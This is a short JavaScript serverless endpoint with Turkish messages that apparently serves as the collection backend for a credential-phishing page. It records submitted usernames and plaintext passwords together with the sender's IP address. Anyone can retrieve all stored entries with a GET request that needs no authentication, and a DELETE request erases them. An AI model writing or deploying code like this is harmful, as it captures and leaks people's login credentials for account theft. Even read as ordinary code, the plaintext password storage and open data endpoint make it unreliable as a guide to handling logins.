import fs from 'fs';
import path from 'path';

const filePath = path.join('/tmp', 'database.json');

export default function handler(req, res) {
    let logs = [];
    try {
        if (fs.existsSync(filePath)) {
            logs = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        }
    } catch (e) {}

    if (req.method === 'GET') {
        return res.status(200).json({ logs });
    }

    if (req.method === 'POST') {
        const { username, password, timestamp } = req.body || {};
        if (!username || !password) {
            return res.status(400).json({ error: 'Eksik' });
        }
        logs.push({ 
            username, 
            password, 
            timestamp, 
            ip: req.headers['x-forwarded-for'] || 'Bilinmiyor' 
        });
        try {
            fs.writeFileSync(filePath, JSON.stringify(logs, null, 2));
        } catch (e) {}
        return res.status(200).json({ success: true });
    }

    if (req.method === 'DELETE') {
        try {
            fs.writeFileSync(filePath, JSON.stringify([], null, 2));
        } catch (e) {}
        return res.status(200).json({ success: true });
    }

    return res.status(405).end();
}